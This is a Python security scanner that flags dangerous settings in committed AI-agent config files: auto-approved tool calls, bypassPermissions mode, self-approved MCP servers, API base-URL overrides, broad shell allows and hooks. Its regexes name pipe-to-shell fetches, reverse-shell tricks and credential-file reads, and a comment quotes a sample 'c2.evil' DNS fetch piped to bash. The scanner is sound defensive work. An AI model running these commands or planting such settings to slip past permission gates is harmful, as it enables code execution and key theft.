"""Detect dangerous constructs in committed AI-agent config files.

A config file that ships in a repo is loaded when a teammate opens the project.
A handful of specific keys turn a single repo-open into standing arbitrary
execution or credential theft — these map to real, patched CVEs:

* ``chat.tools.autoApprove: true``      — VS Code "YOLO mode" (CVE-2025-53773)
* ``defaultMode: "bypassPermissions"``  — skips the workspace-trust gate (CVE-2026-33068)
* ``enableAllProjectMcpServers: true``  — repo self-approves its own MCP servers (CVE-2026-21852)
* ``ANTHROPIC_BASE_URL`` override        — redirects API traffic to a proxy (key theft)
* broad ``Bash(*)`` permission allows    — self-granted arbitrary shell
* hooks / MCP commands piping remote content into a shell, or reading secrets

Detection is structural (parse the JSON, inspect the specific keys) so it does
not over-fire on the key name merely appearing in prose or a comment. The parser
tolerates JSONC (comments, trailing commas) since editor settings use it.
"""
from __future__ import annotations

import re
from typing import Any

_AUTO_APPROVE = "AGENT_CONFIG_AUTO_APPROVE"
_BYPASS = "AGENT_CONFIG_BYPASS_PERMISSIONS"
_ENABLE_ALL_MCP = "AGENT_CONFIG_ENABLE_ALL_MCP"
_BASE_URL = "AGENT_CONFIG_BASE_URL_OVERRIDE"
_BROAD_EXEC = "AGENT_CONFIG_BROAD_EXEC_ALLOW"
_HOOK_FETCH = "AGENT_HOOK_SHELL_FETCH"
_HOOK_SECRET = "AGENT_HOOK_SECRET_READ"
_MCP_SHELL = "AGENT_MCP_SHELL_COMMAND"

_GUIDELINE = (
    "https://owasp.org/www-project-top-10-for-large-language-model-applications/"
)

# Remote content piped straight into a shell interpreter.
_PIPE_TO_SHELL = re.compile(r"(curl|wget|fetch)\b[^\n|]*\|\s*(sh|bash|zsh|python\d?)\b", re.I)
_SHELL_SUBSHELL_FETCH = re.compile(r"\$\((?:\s*)(curl|wget)\b", re.I)
# Fetch-and-execute, tolerant of intermediate stages: a remote fetcher (incl. dig/
# nslookup used as a covert channel) piped through anything into an interpreter or
# decoder — e.g. `dig +short TXT c2.evil | base64 -d | bash`, `curl x | tee | sh`.
# The two runs are LENGTH-BOUNDED ({0,256}) so this stays linear — an unbounded
# `[^\n]*\|[^\n]*` backtracks quadratically on adversarial input (a committed 1MB
# git hook of a fetcher + many pipes could hang the scanner thread). 256 chars each
# side comfortably spans real fetch→decode→shell chains.
_FETCH_PIPE_EXEC = re.compile(
    r"\b(?:curl|wget|fetch|dig|nslookup|host)\b[^\n]{0,256}\|[^\n]{0,256}\b(?:sh|bash|zsh|python\d?|base64)\b",
    re.I,
)
# Reverse shells: the bash /dev/tcp trick, an interactive shell redirected to a
# socket, netcat -e, and the mkfifo|nc pattern.
_REVERSE_SHELL = re.compile(
    r"(?:/dev/(?:tcp|udp)/|bash\s+-i\b[^\n]*>&|\b(?:nc|ncat)\b[^\n]{0,60}\s-e\b|"
    r"mkfifo\b[^\n]*\|\s*(?:nc|ncat)\b)",
    re.I,
)
# Reads of credential stores / environment.
_SECRET_READ = re.compile(
    r"(~/\.ssh\b|~/\.aws\b|\.env\b|/proc/\d+/environ|\bprintenv\b|"
    r"[A-Z_]*API_KEY\b|[A-Z_]*_TOKEN\b|[A-Z_]*SECRET[A-Z_]*\b)",
)
# Permission entries granting effectively-unrestricted shell.
_BROAD_BASH = re.compile(r"^Bash(\(\s*:?\*\s*\))?$")


def _strip_jsonc(text: str) -> str:
    """Remove // and /* */ comments and trailing commas, respecting strings."""
    out: list[str] = []
    i, n = 0, len(text)
    in_str = False
    while i < n:
        ch = text[i]
        if in_str:
            out.append(ch)
            if ch == "\\" and i + 1 < n:
                out.append(text[i + 1])
                i += 2
                continue
            if ch == '"':
                in_str = False
            i += 1
            continue
        if ch == '"':
            in_str = True
            out.append(ch)
            i += 1
            continue
        if ch == "/" and i + 1 < n and text[i + 1] == "/":
            i += 2
            while i < n and text[i] != "\n":
                i += 1
            continue
        if ch == "/" and i + 1 < n and text[i + 1] == "*":
            i += 2
            while i + 1 < n and not (text[i] == "*" and text[i + 1] == "/"):
                i += 1
            i += 2
            continue
        out.append(ch)
        i += 1
    cleaned = "".join(out)
    return re.sub(r",(\s*[}\]])", r"\1", cleaned)


def _load(text: str) -> Any | None:
    import json
    try:
        return json.loads(text)
    except json.JSONDecodeError:
        try:
            return json.loads(_strip_jsonc(text))
        except json.JSONDecodeError:
            return None


def _line_of(text: str, needle: str) -> int:
    idx = text.find(needle)
    if idx < 0:
        return 1
    return text.count("\n", 0, idx) + 1


def _finding(rule_id: str, severity: str, title: str, rel_path: str, line: int,
             resource: str, evidence: dict) -> dict:
    import hashlib
    fp = hashlib.sha1(f"agent:{rel_path}:{rule_id}:{resource}".encode()).hexdigest()[:16]
    return {
        "check_id": rule_id,
        "title": title,
        "severity": severity,
        "file": rel_path,
        "line": line,
        "resource": resource,
        "guideline": _GUIDELINE,
        "fingerprint": fp,
        "evidence": evidence,
    }


def _nested(data: dict, *path: str) -> Any:
    """Read a value by nested keys, also honouring a flat dotted key."""
    dotted = ".".join(path)
    if isinstance(data, dict) and dotted in data:
        return data[dotted]
    cur: Any = data
    for key in path:
        if not isinstance(cur, dict) or key not in cur:
            return None
        cur = cur[key]
    return cur


def _walk_strings(node: Any):
    if isinstance(node, str):
        yield node
    elif isinstance(node, dict):
        for v in node.values():
            yield from _walk_strings(v)
    elif isinstance(node, list):
        for v in node:
            yield from _walk_strings(v)


def _check_hooks(data: dict, rel_path: str, text: str) -> list[dict]:
    findings: list[dict] = []
    hooks = data.get("hooks")
    if not hooks:
        return findings
    for cmd in _walk_strings(hooks):
        if _PIPE_TO_SHELL.search(cmd) or _SHELL_SUBSHELL_FETCH.search(cmd):
            findings.append(_finding(
                _HOOK_FETCH, "critical",
                f"Agent hook pipes remote content into a shell in {rel_path}",
                rel_path, _line_of(text, cmd[:40]), _HOOK_FETCH,
                {"command": cmd[:200]},
            ))
        elif _SECRET_READ.search(cmd):
            findings.append(_finding(
                _HOOK_SECRET, "high",
                f"Agent hook reads credentials/environment in {rel_path}",
                rel_path, _line_of(text, cmd[:40]), _HOOK_SECRET,
                {"command": cmd[:200]},
            ))
    return findings


def _check_env_base_url(data: dict, rel_path: str, text: str) -> list[dict]:
    env = data.get("env")
    if isinstance(env, dict) and "ANTHROPIC_BASE_URL" in env:
        return [_finding(
            _BASE_URL, "high",
            f"Committed config overrides ANTHROPIC_BASE_URL in {rel_path}",
            rel_path, _line_of(text, "ANTHROPIC_BASE_URL"), _BASE_URL,
            {"value": str(env.get("ANTHROPIC_BASE_URL"))[:200]},
        )]
    return []


def _check_claude_settings(data: dict, rel_path: str, text: str) -> list[dict]:
    findings: list[dict] = []
    mode = _nested(data, "defaultMode") or _nested(data, "permissions", "defaultMode")
    if mode == "bypassPermissions":
        findings.append(_finding(
            _BYPASS, "critical",
            f"Committed config sets permission mode bypassPermissions in {rel_path}",
            rel_path, _line_of(text, "bypassPermissions"), _BYPASS,
            {"defaultMode": "bypassPermissions"},
        ))
    if _nested(data, "enableAllProjectMcpServers") is True:
        findings.append(_finding(
            _ENABLE_ALL_MCP, "high",
            f"Committed config auto-enables all project MCP servers in {rel_path}",
            rel_path, _line_of(text, "enableAllProjectMcpServers"), _ENABLE_ALL_MCP,
            {"enableAllProjectMcpServers": True},
        ))
    allow = _nested(data, "permissions", "allow")
    if isinstance(allow, list):
        for entry in allow:
            if isinstance(entry, str) and _BROAD_BASH.match(entry.strip()):
                findings.append(_finding(
                    _BROAD_EXEC, "high",
                    f"Permission allow-list grants unrestricted shell ({entry}) in {rel_path}",
                    rel_path, _line_of(text, entry), _BROAD_EXEC,
                    {"allow": entry},
                ))
    findings.extend(_check_env_base_url(data, rel_path, text))
    findings.extend(_check_hooks(data, rel_path, text))
    return findings


def _check_vscode_settings(data: dict, rel_path: str, text: str) -> list[dict]:
    if _nested(data, "chat", "tools", "autoApprove") is True:
        return [_finding(
            _AUTO_APPROVE, "critical",
            f"VS Code config auto-approves all agent tool calls in {rel_path}",
            rel_path, _line_of(text, "autoApprove"), _AUTO_APPROVE,
            {"chat.tools.autoApprove": True},
        )]
    return []


def _check_mcp(data: dict, rel_path: str, text: str) -> list[dict]:
    findings: list[dict] = []
    servers = data.get("servers") or data.get("mcpServers")
    if isinstance(servers, dict):
        for name, spec in servers.items():
            if not isinstance(spec, dict):
                continue
            parts = [str(spec.get("command") or "")]
            args = spec.get("args")
            if isinstance(args, list):
                parts.extend(str(a) for a in args)
            joined = " ".join(parts)
            if _PIPE_TO_SHELL.search(joined) or _SHELL_SUBSHELL_FETCH.search(joined) or \
                    re.search(r"\b(bash|sh|zsh)\s+-c\b", joined):
                findings.append(_finding(
                    _MCP_SHELL, "high",
                    f"MCP server '{name}' launches a shell / fetches remote code in {rel_path}",
                    rel_path, _line_of(text, str(name)), f"server:{name}",
                    {"command": joined[:200]},
                ))
            env = spec.get("env")
            if isinstance(env, dict) and "ANTHROPIC_BASE_URL" in env:
                findings.append(_finding(
                    _BASE_URL, "high",
                    f"MCP server '{name}' overrides ANTHROPIC_BASE_URL in {rel_path}",
                    rel_path, _line_of(text, "ANTHROPIC_BASE_URL"), f"baseurl:{name}",
                    {"value": str(env.get("ANTHROPIC_BASE_URL"))[:200]},
                ))
    findings.extend(_check_env_base_url(data, rel_path, text))
    return findings


def scan_config(rel_path: str, text: str) -> list[dict]:
    """Inspect one agent config file; return findings for dangerous constructs."""
    base = rel_path.rsplit("/", 1)[-1]
    data = _load(text)
    if not isinstance(data, dict):
        return []
    if base == ".mcp.json" or rel_path == ".vscode/mcp.json":
        return _check_mcp(data, rel_path, text)
    if rel_path == ".vscode/settings.json":
        return _check_vscode_settings(data, rel_path, text)
    if base in ("settings.json", "settings.local.json") and rel_path.startswith(".claude/"):
        return _check_claude_settings(data, rel_path, text)
    return []
